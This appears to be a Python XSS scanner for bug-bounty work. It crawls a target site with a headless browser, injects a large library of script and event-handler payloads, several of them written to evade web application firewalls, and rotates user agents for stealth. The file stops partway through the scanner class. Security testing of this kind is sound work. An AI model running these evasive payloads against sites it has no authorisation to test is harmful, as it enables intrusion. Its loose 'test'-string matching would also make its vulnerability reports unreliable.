#!/usr/bin/env python3
"""
Professional XSS Scanner for Bug Bounty Hunting
Automates XSS vulnerability detection using headless browser
"""

import asyncio
import json
import logging
import random
import re
import sys
import time
from argparse import ArgumentParser
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Set, Tuple, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse


try:
    from playwright.async_api import async_playwright, Page, Browser, BrowserContext
except ImportError:
    
    if '--help' not in sys.argv and '-h' not in sys.argv:
        print("Error: Playwright not installed. Run: pip install playwright && playwright install chromium")
        sys.exit(1)
    
    class Page:
        pass
    class Browser:
        pass
    class BrowserContext:
        pass
    async_playwright = None


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_scanner.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class XSSPayload:
    """XSS payload library with various attack vectors - WAF-aware"""
    
    
    TEST_MARKER = "XSS_TEST_MARKER_2024"
    ERROR_MARKER = "XSS_ERROR_DETECTED"
    
    
    PAYLOADS_STANDARD = [
        "<script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
    ]
    
    @classmethod
    def _get_waf_payloads(cls) -> List[str]:
        """Get WAF-aware payloads using test marker instead of alert - Enhanced for high success rate"""
        test_marker = cls.TEST_MARKER
        error_marker = cls.ERROR_MARKER
        
        return [
            
            "<script>test</script>",
            "<script>console.log('test')</script>",
            "<script>document.write('test')</script>",
            "<script>document.writeln('test')</script>",
            "<script>eval('test')</script>",
            "<script>Function('test')()</script>",
            
            
            "<img src=x onerror='test'>",
            "<img src=x onerror=\"test\">",
            "<img src=x onerror=test>",
            "<img src=1 onerror=test>",
            "<img src=x onerror='test'/>",
            "<img src=x onerror='test'></img>",
            "<image src=x onerror='test'>",
            f"<img src=x onerror='{test_marker}'>",
            f"<img src=x onerror=\"{test_marker}\">",
            f"<img src=x onerror={test_marker}>",
            f"<img src=x onerror=alert('{test_marker}')>",
            "<img src=x onerror=eval('test')>",
            "<img src=x onerror=Function('test')()>",
            
            
            "<svg onload='test'>",
            "<svg/onload='test'>",
            "<svg onload=\"test\">",
            f"<svg onload=\"{test_marker}\">",
            "<svg><script>test</script>",
            "<svg><script>console.log('test')</script>",
            "<svg><animate onbegin='test' attributeName=x dur=1s>",
            "<svg onmouseover='test'>",
            "<svg onclick='test'>",
            "<svg><animatetransform onbegin='test'>",
            
            
            "<body onload='test'>",
            "<body onpageshow='test'>",
            "<body onfocus='test'>",
            "<body onerror='test'>",
            "<iframe src=javascript:test>",
            "<iframe srcdoc=<script>test</script>>",
            "<iframe src='javascript:test'>",
            "<object data=javascript:test>",
            "<embed src=javascript:test>",
            "<embed src='javascript:test'>",
            "<frame src=javascript:test>",
            "<frameset onload='test'>",
            
            
            "<input onfocus='test' autofocus>",
            "<input autofocus onfocus=test>",
            "<input onblur='test' autofocus>",
            "<input onclick='test'>",
            "<input onmouseover='test'>",
            "<input onerror='test'>",
            "<select onfocus='test' autofocus>",
            "<select autofocus onfocus=test>",
            "<select onchange='test'>",
            "<textarea onfocus='test' autofocus>",
            "<textarea autofocus onfocus=test>",
            "<textarea onblur='test'>",
            "<keygen onfocus='test' autofocus>",
            "<keygen autofocus onfocus=test>",
            "<button onclick='test'>",
            "<button onfocus='test' autofocus>",
            "<form onsubmit='test'>",
            "<form onreset='test'>",
            
            
            "<video><source onerror='test'>",
            "<video onerror='test'>",
            "<video onclick='test'>",
            "<audio src=x onerror='test'>",
            "<audio src=x onerror=test>",
            "<audio onerror='test'>",
            "<track onerror='test'>",
            "<source onerror='test'>",
            
            
            "<details open ontoggle='test'>",
            "<details open ontoggle=test>",
            "<details onclick='test'>",
            "<marquee onstart='test'>",
            "<marquee onstart=test>",
            "<marquee onmouseover='test'>",
            "<div onmouseover='test'>",
            "<div onclick='test'>",
            "<div onfocus='test' tabindex=0>",
            "<p onmouseover='test'>",
            "<span onclick='test'>",
            "<a onclick='test'>",
            "<h1 onclick='test'>",
            "<section onclick='test'>",
            "<article onclick='test'>",
            
            
            "<img src=x onerror=&#116;&#101;&#115;&#116;>",  
            "<img src=x onerror=&#x74;&#x65;&#x73;&#x74;>",  
            "<script>&#116;&#101;&#115;&#116;</script>",  
            "<script>&#x74;&#x65;&#x73;&#x74;</script>",  
            "<img src=x onerror=String.fromCharCode(116,101,115,116)>",
            
            
            "<ScRiPt>test</ScRiPt>",
            "<SCRIPT>test</SCRIPT>",
            "<Script>test</Script>",
            "<sCrIpT>test</sCrIpT>",
            "<ScRiPt>console.log('test')</ScRiPt>",
            "<IMG src=x onerror='test'>",
            "<ImG src=x onerror='test'>",
            
            
            "'\"><script>test</script>",
            "\"><script>test</script>",
            "';test;//",
            "\";test;//",
            "'><script>test</script>",
            "\"><script>test</script><!--",
            "'\"><img src=x onerror='test'>",
            "\"><img src=x onerror='test'>",
            "';alert('test');//",
            "\";alert('test');//",
            "')}catch(e){test}//",
            "')}catch(e){{test}}//",
            
            
            "<script>eval('test')</script>",
            "<script>eval(location.hash.slice(1))</script>",
            "<script>eval(window.name)</script>",
            "<script>eval(document.location)</script>",
            "<script>eval(document.URL)</script>",
            "<script>eval(location.search.slice(1))</script>",
            "<script>Function('test')()</script>",
            "<script>setTimeout('test',0)</script>",
            "<script>setInterval('test',1000)</script>",
            "<script>new Function('test')()</script>",
            
            
            "javascript:test",
            "JaVaScRiPt:test",
            "JAVASCRIPT:test",
            "javascript:alert('test')",
            "javascript:void(0);test",
            "javascript:void(test)",
            "javascript:document.write('test')",
            
            
            f"<script>setTimeout(function(){{document.body.innerHTML+='{test_marker}'}},500)</script>",
            f"<script>setTimeout(function(){{document.body.innerHTML+='{test_marker}'}},1000)</script>",
            f"<script>setTimeout(function(){{document.body.innerHTML+='{test_marker}'}},2000)</script>",
            f"<img src=x onerror=\"setTimeout(function(){{document.body.innerHTML+='{test_marker}'}},1000)\">",
            f"<svg onload=\"setTimeout(function(){{document.body.innerHTML+='{test_marker}'}},1000)\">",
            f"<script>setInterval(function(){{document.body.innerHTML+='{test_marker}'}},1000)</script>",
            
            
            f"<script>throw new Error('{error_marker}')</script>",
            f"<img src=x onerror=\"throw new Error('{error_marker}')\">",
            f"<script>throw '{error_marker}'</script>",
            f"<script>throw new TypeError('{error_marker}')</script>",
            f"<script>throw new ReferenceError('{error_marker}')</script>",
            
            
            f"<script>console.error('{error_marker}')</script>",
            f"<script>console.log('{test_marker}')</script>",
            f"<script>console.warn('{test_marker}')</script>",
            f"<script>console.info('{test_marker}')</script>",
            f"<img src=x onerror=\"console.log('{test_marker}')\">",
            
            
            "<script>test</script>",
            "<scr<script>ipt>test</scr</script>ipt>",
            "<script>test</script>",
            "<script>test</script>",
            "<script>test</script>",
            "<script>test</script>",
            "<img src=x onerror='test'",
            "<img/src=x/onerror='test'>",
            "<img src=x onerror='test'//",
            "<img src=x onerror='test'/>",
            
            
            "test",
            ">test<",
            "'test'",
            '"test"',
            "test'",
            "test\"",
            "'test",
            "\"test",
            
            
            "';test;//",
            "\";test;//",
            "');test;//",
            "\");test;//",
            "';test;alert('x');//",
            "\";test;alert('x');//",
            
            
            "test",
            "'test'",
            "\"test\"",
            "test'",
            "test\"",
            "'>test<",
            "\">test<",
            "'onerror='test'",
            "\"onerror=\"test\"",
            
            
            "test",
            "test;",
            "test}",
            "test;/*",
            "*/test",
            
            
            "<div onmouseenter='test'>",
            "<div onmouseleave='test'>",
            "<div onmousedown='test'>",
            "<div onmouseup='test'>",
            "<div ondblclick='test'>",
            "<div oncontextmenu='test'>",
            "<div onkeydown='test'>",
            "<div onkeyup='test'>",
            "<div onkeypress='test'>",
            "<div onscroll='test'>",
            "<div onresize='test'>",
            "<div onselect='test'>",
            "<div onchange='test'>",
            "<div oninput='test'>",
            "<div oninvalid='test'>",
            "<div onreset='test'>",
            "<div onsearch='test'>",
            "<div onsubmit='test'>",
            "<div onwheel='test'>",
            
            
            "<input oninput='test'>",
            "<input oninvalid='test'>",
            "<input onsearch='test'>",
            "<input onselect='test'>",
            
            
            "<dialog open onclick='test'>",
            "<menu onclick='test'>",
            "<menuitem onclick='test'>",
            "<output onclick='test'>",
            "<progress onclick='test'>",
            "<meter onclick='test'>",
            
            
            "<div data-test='test' onclick='test'>",
            
            
            "<div style='test'>",
            "<div style='test;'>",
            "<div style='test;x:expression(test)'>",  
            
            
            "<img src=x onerror=%27test%27>",  
            "<img src=x onerror=%22test%22>",  
            "<script>%74%65%73%74</script>",  
            "<script>\\x74\\x65\\x73\\x74</script>",  
            "<script>\\u0074\\u0065\\u0073\\u0074</script>",  
            
            
            "<script>`test`</script>",
            "<script>`${test}`</script>",
            "<script>test``</script>",
            
            
            "<svg/onload=test>",
            "<svg/onload='test'>",
            "<svg/onload=\"test\">",
            "<img/src=x/onerror=test>",
            "<img/src=x/onerror='test'>",
            "<iframe/srcdoc=<script>test</script>>",
            
            
            "<div id='test'>",
            "<div class='test'>",
            "<div name='test'>",
        ]
    
    @classmethod
    def get_payloads(cls, waf_aware: bool = True) -> List[str]:
        """Get XSS payloads - WAF-aware by default"""
        if waf_aware:
            return cls._get_waf_payloads()
        return cls.PAYLOADS_STANDARD
    
    @classmethod
    def get_test_marker(cls) -> str:
        """Get the test marker string"""
        return cls.TEST_MARKER
    
    @classmethod
    def get_error_marker(cls) -> str:
        """Get the error marker string"""
        return cls.ERROR_MARKER


class XSSDetector:
    """Detects XSS vulnerabilities in web pages - WAF-aware"""
    
    def __init__(self, page: Page, waf_aware: bool = True):
        self.page = page
        self.waf_aware = waf_aware
        self.vulnerable = False
        self.detection_method = None
        self.payload_used = None
        self.test_marker = XSSPayload.get_test_marker()
        self.error_marker = XSSPayload.get_error_marker()
        
    async def detect_vulnerability(self, payload: str) -> Tuple[bool, str]:
        """
        Detect XSS vulnerability using multiple methods - WAF-aware
        Returns: (is_vulnerable, detection_method)
        """
        self.payload_used = payload
        
        
        alert_detected = asyncio.Event()
        dialog_text = []
        
        async def handle_dialog(dialog):
            dialog_text.append(dialog.message)
            alert_detected.set()
            await dialog.accept()
        
        if not self.waf_aware:
            self.page.on("dialog", handle_dialog)
        
        
        console_messages = []
        
        async def handle_console(msg):
            console_messages.append(msg.text)
        
        self.page.on("console", handle_console)
        
        
        page_errors = []
        
        async def handle_page_error(error):
            page_errors.append(error.message)
        
        self.page.on("pageerror", handle_page_error)
        
        
        mutation_observer = f"""
        (function() {{
            window.__xss_test_marker__ = false;
            window.__xss_error_marker__ = false;
            window.__xss_test_content__ = '';
            
            const observer = new MutationObserver(function(mutations) {{
                mutations.forEach(function(mutation) {{
                    if (mutation.addedNodes.length) {{
                        mutation.addedNodes.forEach(function(node) {{
                            if (node.nodeType === 1) {{
                                const html = node.innerHTML || node.outerHTML || '';
                                const text = node.textContent || '';
                                
                                // Check for test marker
                                if (html.includes('{self.test_marker}') || text.includes('{self.test_marker}')) {{
                                    window.__xss_test_marker__ = true;
                                    window.__xss_test_content__ = html;
                                }}
                                
                                // Check for error marker
                                if (html.includes('{self.error_marker}') || text.includes('{self.error_marker}')) {{
                                    window.__xss_error_marker__ = true;
                                }}
                                
                                // Check for "test" word in script context
                                if (html.includes('<script') && (html.includes('test') || html.includes('Test'))) {{
                                    window.__xss_test_marker__ = true;
                                }}
                                
                                // Check for common XSS patterns
                                const xssPatterns = ['onerror', 'onload', 'onclick', 'onfocus', 'onmouseover', 
                                                    'onmouseenter', 'onmouseleave', 'ondblclick', 'oncontextmenu',
                                                    'onkeydown', 'onkeyup', 'onkeypress', 'onscroll', 'onresize',
                                                    'onselect', 'onchange', 'oninput', 'oninvalid', 'onreset',
                                                    'onsearch', 'onsubmit', 'onwheel', 'ontoggle', 'onstart'];
                                for (const pattern of xssPatterns) {{
                                    if (html.includes(pattern)) {{
                                        if (html.includes('test') || html.includes('{self.test_marker}') || 
                                            text.includes('test') || text.includes('{self.test_marker}')) {{
                                            window.__xss_test_marker__ = true;
                                            break;
                                        }}
                                    }}
                                }}
                                
                                // Check for script tags
                                if (html.includes('<script') || html.includes('</script>')) {{
                                    if (html.includes('test') || html.includes('{self.test_marker}') || 
                                        text.includes('test') || text.includes('{self.test_marker}')) {{
                                        window.__xss_test_marker__ = true;
                                    }}
                                }}
                                
                                // Check for event handler attributes in the node itself
                                if (node.attributes) {{
                                    for (let attr of node.attributes) {{
                                        if (attr.name.startsWith('on') && 
                                            (attr.value.includes('test') || attr.value.includes('{self.test_marker}'))) {{
                                            window.__xss_test_marker__ = true;
                                            break;
                                        }}
                                    }}
                                }}
                            }}
                        }});
                    }}
                }});
            }});
            observer.observe(document.body, {{
                childList: true,
                subtree: true,
                attributes: true,
                characterData: true
            }});
        }})();
        """
        
        try:
            
            initial_content = await self.page.content()
            
            
            await self.page.evaluate(mutation_observer)
            
            
            await asyncio.sleep(3)  
            
            
            if self.test_marker in payload or 'setTimeout' in payload or 'setInterval' in payload:
                await asyncio.sleep(3.0)  
            
            await asyncio.sleep(0.5)  
            
            
            content = await self.page.content()
            
            
            if not self.waf_aware:
                try:
                    await asyncio.wait_for(alert_detected.wait(), timeout=1)
                    if alert_detected.is_set():
                        self.vulnerable = True
                        self.detection_method = f"Alert dialog detected: {dialog_text[0] if dialog_text else 'XSS'}"
                        return True, self.detection_method
                except asyncio.TimeoutError:
                    pass
            
            
            dom_result = await self.page.evaluate("""
                () => {
                    return {
                        test_marker: window.__xss_test_marker__ === true,
                        error_marker: window.__xss_error_marker__ === true,
                        test_content: window.__xss_test_content__ || ''
                    };
                }
            """)
            
            if dom_result.get('test_marker') or dom_result.get('error_marker'):
                self.vulnerable = True
                if dom_result.get('error_marker'):
                    self.detection_method = "Error marker detected in DOM"
                else:
                    self.detection_method = "Test marker detected in DOM"
                return True, self.detection_method
            
            
            for msg in console_messages:
                if self.test_marker in msg or self.error_marker in msg or 'test' in msg.lower():
                    self.vulnerable = True
                    self.detection_method = f"Marker detected in console: {msg[:50]}"
                    return True, self.detection_method
            
            
            for error in page_errors:
                if self.error_marker in error or self.test_marker in error:
                    self.vulnerable = True
                    self.detection_method = f"Marker detected in page error: {error[:50]}"
                    return True, self.detection_method
            
            
            if self._is_payload_reflected(content, payload, initial_content):
                
                if self._check_test_in_context(content, payload):
                    self.vulnerable = True
                    self.detection_method = "Payload reflected with test marker in response"
                    return True, self.detection_method
                else:
                    
                    self.detection_method = "Payload reflected in response (potential XSS)"
                    return False, self.detection_method
            
            return False, ""
            
        except Exception as e:
            logger.error(f"Error detecting vulnerability: {e}")
            return False, str(e)
        finally:
            if not self.waf_aware:
                self.page.remove_listener("dialog", handle_dialog)
            self.page.remove_listener("console", handle_console)
            self.page.remove_listener("pageerror", handle_page_error)
    
    def _is_payload_reflected(self, content: str, payload: str, initial_content: str = "") -> bool:
        """Check if payload is reflected in content"""
        
        payload_clean = payload.strip()
        
        
        if payload_clean in content:
            return True
        
        
        payload_variations = [
            payload,
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;'),
            payload.replace("'", '&#39;'),
            payload.replace('<', '%3C').replace('>', '%3E'),
        ]
        
        for variant in payload_variations:
            if variant in content and variant not in initial_content:
                return True
        
        
        if '<script' in payload.lower():
            if '<script' in content.lower():
                
                script_pos = content.lower().find('<script')
                if script_pos != -1:
                    snippet = content[script_pos:script_pos+200].lower()
                    if 'test' in snippet or self.test_marker.lower() in snippet:
                        return True
        
        
        event_handlers = ['onerror', 'onload', 'onclick', 'onfocus', 'onmouseover', 'onmouseenter',
                         'onmouseleave', 'ondblclick', 'oncontextmenu', 'onkeydown', 'onkeyup',
                         'onkeypress', 'onscroll', 'onresize', 'onselect', 'onchange', 'oninput',
                         'oninvalid', 'onreset', 'onsearch', 'onsubmit', 'onwheel', 'ontoggle',
                         'onstart', 'onpageshow', 'onblur', 'onmousedown', 'onmouseup']
        for handler in event_handlers:
            if handler in payload.lower() and handler in content.lower():
                
                handler_pos = content.lower().find(handler)
                if handler_pos != -1:
                    snippet = content[handler_pos:handler_pos+200].lower()  
                    if 'test' in snippet or self.test_marker.lower() in snippet:
                        return True
                    
                    if f'{handler}=' in snippet:
                        
                        attr_start = snippet.find(f'{handler}=')
                        if attr_start != -1:
                            attr_value = snippet[attr_start:attr_start+250]
                            if 'test' in attr_value or self.test_marker.lower() in attr_value:
                                return True
        
        return False
    
    def _check_test_in_context(self, content: str, payload: str) -> bool:
        """Check if test marker or 'test' appears in XSS context - Enhanced for higher success rate"""
        content_lower = content.lower()
        
        
        if self.test_marker.lower() in content_lower or self.error_marker.lower() in content_lower:
            return True
        
        
        if '<script' in payload.lower() or 'script' in payload.lower():
            
            script_pattern = r'<script[^>]*>.*?test.*?</script>'
            if re.search(script_pattern, content, re.IGNORECASE | re.DOTALL):
                return True
            
            script_pattern2 = r'<script[^>]*>.*?test'
            if re.search(script_pattern2, content, re.IGNORECASE | re.DOTALL):
                return True
        
        
        event_pattern = r'on\w+\s*=\s*["\']?[^"\'>]*test[^"\'>]*["\']?'
        if re.search(event_pattern, content, re.IGNORECASE):
            return True
        
        
        attr_pattern = r'\w+\s*=\s*["\']?[^"\'>]*test[^"\'>]*["\']?'
        
        if any(x in payload.lower() for x in ['onerror', 'onload', 'onclick', 'src=', 'href=']):
            matches = re.findall(attr_pattern, content, re.IGNORECASE)
            for match in matches:
                if 'test' in match.lower() and any(x in match.lower() for x in ['on', 'src', 'href', 'data']):
                    return True
        
        
        tag_pattern = r'<[^>]*test[^>]*>'
        if re.search(tag_pattern, content, re.IGNORECASE):
            return True
        
        
        js_pattern = r'(?:script|javascript)[^>]*>.*?test'
        if re.search(js_pattern, content, re.IGNORECASE | re.DOTALL):
            return True
        
        
        url_pattern = r'(?:href|src|action)\s*=\s*["\']?[^"\'>]*test[^"\'>]*["\']?'
        if re.search(url_pattern, content, re.IGNORECASE):
            return True
        
        return False


class WebCrawler:
    """Crawls websites and discovers URLs and forms"""
    
    def __init__(self, base_url: str, max_depth: int = 2, max_pages: int = 50):
        self.base_url = base_url
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.visited_urls: Set[str] = set()
        self.urls_to_visit: List[Tuple[str, int]] = [(base_url, 0)]
        self.forms: List[Dict] = []
        self.discovered_parameters: Set[str] = set()  
        self.parameter_urls: Dict[str, Set[str]] = {}  
        self.sensitive_js: List[Dict] = []  
    
    async def crawl(self, page: Page) -> List[Dict]:
        """Crawl the website and discover forms and URLs"""
        discovered_forms = []
        
        while self.urls_to_visit and len(self.visited_urls) < self.max_pages:
            url, depth = self.urls_to_visit.pop(0)
            
            if url in self.visited_urls or depth > self.max_depth:
                continue
            
            
            try:
                logger.info(f"Crawling: {url} (depth: {depth})")
                response = await page.goto(url, wait_until="networkidle", timeout=30000)
                
                if response and response.status >= 400:
                    logger.warning(f"HTTP {response.status} for {url}")
                    continue
                
                self.visited_urls.add(url)
                
                
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param_name in params.keys():
                    self.discovered_parameters.add(param_name)
                    if param_name not in self.parameter_urls:
                        self.parameter_urls[param_name] = set()
                    self.parameter_urls[param_name].add(url)
                
                
                forms = await self._extract_forms(page, url)
                discovered_forms.extend(forms)
                
                
                if depth < self.max_depth:
                    links = await self._extract_links(page, url)
                    for link in links:
                        
                        link_parsed = urlparse(link)
                        link_params = parse_qs(link_parsed.query)
                        for param_name in link_params.keys():
                            self.discovered_parameters.add(param_name)
                            if param_name not in self.parameter_urls:
                                self.parameter_urls[param_name] = set()
                            self.parameter_urls[param_name].add(link)
                        
                        if link not in self.visited_urls:
                            self.urls_to_visit.append((link, depth + 1))
                
                
                await self._extract_parameters_from_page(page, url)

                
                await self._extract_sensitive_js(page, url)
                
                
                await asyncio.sleep(random.uniform(1.0, 2.5))
                
            except Exception as e:
                logger.error(f"Error crawling {url}: {e}")
                continue
        
        return discovered_forms
    
    async def _extract_forms(self, page: Page, url: str) -> List[Dict]:
        """Extract forms from the page"""
        forms = []
        
        try:
            form_elements = await page.query_selector_all("form")
            
            for form in form_elements:
                form_data = {
                    'url': url,
                    'method': await form.get_attribute('method') or 'GET',
                    'action': await form.get_attribute('action') or url,
                    'inputs': []
                }
                
                
                inputs = await form.query_selector_all("input, textarea, select")
                for inp in inputs:
                    input_type = await inp.get_attribute('type') or 'text'
                    input_name = await inp.get_attribute('name')
                    
                    if input_name and input_type not in ['submit', 'button', 'hidden']:
                        form_data['inputs'].append({
                            'name': input_name,
                            'type': input_type
                        })
                
                if form_data['inputs']:
                    forms.append(form_data)
                    
        except Exception as e:
            logger.error(f"Error extracting forms from {url}: {e}")
        
        return forms
    
    async def _extract_links(self, page: Page, base_url: str) -> List[str]:
        """Extract links from the page - comprehensive discovery"""
        links = []
        
        try:
            
            link_elements = await page.query_selector_all("a[href]")
            
            for link in link_elements:
                href = await link.get_attribute('href')
                if href:
                    absolute_url = urljoin(base_url, href)
                    parsed = urlparse(absolute_url)
                    
                    
                    base_domain = urlparse(self.base_url).netloc
                    if parsed.netloc == base_domain or not parsed.netloc:
                        
                        clean_url = urlunparse(parsed._replace(fragment=''))
                        if clean_url not in self.visited_urls:
                            links.append(clean_url)
            
            
            form_elements = await page.query_selector_all("form[action]")
            for form in form_elements:
                action = await form.get_attribute('action')
                if action:
                    absolute_url = urljoin(base_url, action)
                    parsed = urlparse(absolute_url)
                    base_domain = urlparse(self.base_url).netloc
                    if parsed.netloc == base_domain or not parsed.netloc:
                        clean_url = urlunparse(parsed._replace(fragment=''))
                        if clean_url not in self.visited_urls:
                            links.append(clean_url)
            
            
            js_links = await page.evaluate("""
                () => {
                    const links = [];
                    // Find onclick handlers with URLs
                    document.querySelectorAll('[onclick]').forEach(el => {
                        const onclick = el.getAttribute('onclick');
                        const urlMatch = onclick.match(/['"](https?:\/\/[^'"]+|['"]\/[^'"]+)['"]/);
                        if (urlMatch) {
                            links.push(urlMatch[1]);
                        }
                    });
                    // Find data-href, data-url attributes
                    document.querySelectorAll('[data-href], [data-url]').forEach(el => {
                        const href = el.getAttribute('data-href') || el.getAttribute('data-url');
                        if (href) links.push(href);
                    });
                    return links;
                }
            """)
            
            for js_link in js_links:
                if js_link:
                    absolute_url = urljoin(base_url, js_link)
                    parsed = urlparse(absolute_url)
                    base_domain = urlparse(self.base_url).netloc
                    if parsed.netloc == base_domain or not parsed.netloc:
                        clean_url = urlunparse(parsed._replace(fragment=''))
                        if clean_url not in self.visited_urls:
                            links.append(clean_url)
        
        except Exception as e:
            logger.error(f"Error extracting links from {base_url}: {e}")
        
        return list(set(links))
    
    async def _extract_parameters_from_page(self, page: Page, url: str):
        """Extract URL parameters from page content and JavaScript"""
        try:
            
            js_params = await page.evaluate("""
                () => {
                    const params = new Set();
                    try {
                        // Check for common parameter patterns in JavaScript
                        const scripts = Array.from(document.querySelectorAll('script'));
                        scripts.forEach(script => {
                            const content = script.textContent || script.innerHTML || '';
                            // Find URL parameter patterns
                            const paramPattern = /[?&]([a-zA-Z0-9_]+)=/g;
                            let match;
                            while ((match = paramPattern.exec(content)) !== null) {
                                params.add(match[1]);
                            }
                            // Find location.search patterns
                            const locationPattern = /location\\.search[^;]*[?&]([a-zA-Z0-9_]+)/g;
                            while ((match = locationPattern.exec(content)) !== null) {
                                params.add(match[1]);
                            }
                            // Find URLSearchParams patterns
                            const urlParamsPattern = /(?:new\\s+)?URLSearchParams\\s*\\([^)]*['"]([^'"]+)['"]/g;
                            while ((match = urlParamsPattern.exec(content)) !== null) {
                                const urlPart = match[1];
                                const urlParamMatch = urlPart.match(/[?&]([a-zA-Z0-9_]+)=/g);
                                if (urlParamMatch) {
                                    urlParamMatch.forEach(m => {
                                        const paramName = m.replace(/[?&]=/g, '').split('=')[0];
                                        if (paramName) params.add(paramName);
                                    });
                                }
                            }
                            // Find window.location patterns
                            const windowLocPattern = /window\\.location(?:\\.href)?\\s*[=:]\\s*['"]([^'"]+)/g;
                            while ((match = windowLocPattern.exec(content)) !== null) {
                                const urlPart = match[1];
                                const urlParamMatch = urlPart.match(/[?&]([a-zA-Z0-9_]+)=/g);
                                if (urlParamMatch) {
                                    urlParamMatch.forEach(m => {
                                        const paramName = m.replace(/[?&]=/g, '').split('=')[0];
                                        if (paramName) params.add(paramName);
                                    });
                                }
                            }
                        });
                    } catch (e) {
                        // Silently continue if extraction fails
                    }
                    return Array.from(params);
                }
            """)
            
            for param in js_params:
                self.discovered_parameters.add(param)
                if param not in self.parameter_urls:
                    self.parameter_urls[param] = set()
                self.parameter_urls[param].add(url)
            
            
            data_params = await page.evaluate("""
                () => {
                    const params = new Set();
                    try {
                        document.querySelectorAll('[data-*]').forEach(el => {
                            Array.from(el.attributes).forEach(attr => {
                                if (attr.name.startsWith('data-') && attr.value && attr.value.includes('?')) {
                                    const urlMatch = attr.value.match(/[?&]([a-zA-Z0-9_]+)=/g);
                                    if (urlMatch) {
                                        urlMatch.forEach(m => {
                                            const paramName = m.replace(/[?&]=/g, '').split('=')[0];
                                            if (paramName) params.add(paramName);
                                        });
                                    }
                                }
                            });
                        });
                    } catch (e) {
                        // Silently continue if extraction fails
                    }
                    return Array.from(params);
                }
            """)
            
            for param in data_params:
                self.discovered_parameters.add(param)
                if param not in self.parameter_urls:
                    self.parameter_urls[param] = set()
                self.parameter_urls[param].add(url)
                
        except Exception as e:
            logger.debug(f"Error extracting parameters from {url}: {e}")
    
    async def _extract_sensitive_js(self, page: Page, url: str):
        """Extract sensitive JavaScript sinks/sources for potential DOM-XSS"""
        try:
            findings = await page.evaluate("""
                () => {
                    const results = [];
                    try {
                        const patterns = [
                            { name: 'document.write', regex: /\\bdocument\\.write\\s*\\(/gi },
                            { name: 'document.writeln', regex: /\\bdocument\\.writeln\\s*\\(/gi },
                            { name: 'innerHTML', regex: /\\.innerHTML\\s*=\\s*/gi },
                            { name: 'outerHTML', regex: /\\.outerHTML\\s*=\\s*/gi },
                            { name: 'insertAdjacentHTML', regex: /insertAdjacentHTML\\s*\\(/gi },
                            { name: 'eval', regex: /\\beval\\s*\\(/gi },
                            { name: 'Function', regex: /\\bnew\\s+Function\\s*\\(|\\bFunction\\s*\\(/gi },
                            { name: 'setTimeout(string)', regex: /setTimeout\\s*\\(\\s*['"]/gi },
                            { name: 'setInterval(string)', regex: /setInterval\\s*\\(\\s*['"]/gi },
                            { name: 'location assign', regex: /(?:window\\.|document\\.)?location\\s*(?:=|\\.href\\s*=|\.assign\\s*\\(|\\.replace\\s*\\()/gi },
                            { name: 'location.href', regex: /(?:window\\.|document\\.)?location\\.href\\s*=/gi },
                            { name: 'URLSearchParams', regex: /new\\s+URLSearchParams\\s*\\(/gi },
                            { name: 'decode from location', regex: /location\\.(?:hash|search|href)/gi },
                            { name: 'document.write from location', regex: /document\\.write.*location/gi },
                            { name: 'innerHTML from location', regex: /\\.innerHTML.*location/gi },
                            { name: 'eval from location', regex: /eval.*location/gi },
                        ];

                        const scripts = Array.from(document.querySelectorAll('script'));
                        scripts.forEach((script, idx) => {
                            const content = script.textContent || script.innerHTML || '';
                            patterns.forEach(p => {
                                if (p.regex.test(content)) {
                                    // Extract context around the match
                                    const matchIndex = content.search(p.regex);
                                    const start = Math.max(0, matchIndex - 100);
                                    const end = Math.min(content.length, matchIndex + 200);
                                    const context = content.substring(start, end);
                                    
                                    results.push({
                                        type: p.name,
                                        context: context.replace(/\\s+/g, ' ').substring(0, 300),
                                        elementIndex: idx
                                    });
                                }
                            });
                        });

                        // Inline event handlers that build HTML/JS
                        document.querySelectorAll('[onclick],[onload],[onerror],[onfocus],[onmouseover],[onmouseenter],[onmouseleave]')
                            .forEach((el) => {
                                Array.from(el.attributes).forEach(attr => {
                                    if (attr.name.startsWith('on')) {
                                        const code = attr.value || '';
                                        if (/document\\.write|innerHTML|eval|location/.test(code)) {
                                            results.push({ 
                                                type: 'inline-event-' + attr.name, 
                                                context: code.substring(0, 300) 
                                            });
                                        }
                                    }
                                });
                            });
                    } catch (e) {
                        // Silently continue if extraction fails
                    }
                    return results;
                }
            """)
            
            for f in findings:
                self.sensitive_js.append({
                    'url': url,
                    'type': f.get('type'),
                    'snippet': f.get('context', '')[:500],
                })
                
        except Exception as e:
            logger.debug(f"Error extracting sensitive JS from {url}: {e}")


class XSSScanner:
    """Main XSS Scanner class - WAF-aware with stealth features"""
    
    
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]
    
    def __init__(self, target_url: str, max_depth: int = 2, max_pages: int = 50, 
                 headless: bool = True, timeout: int = 30000, waf_aware: bool = True,
                 min_delay: float = 1.0, max_delay: float = 3.0, 
                 request_delay: float = 2.0, max_retries: int = 3,
                 cookies: Optional[List[Dict]] = None, 
                 headers: Optional[Dict[str, str]] = None,
                 proxy: Optional[str] = None):
        self.target_url = target_url
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.headless = headless
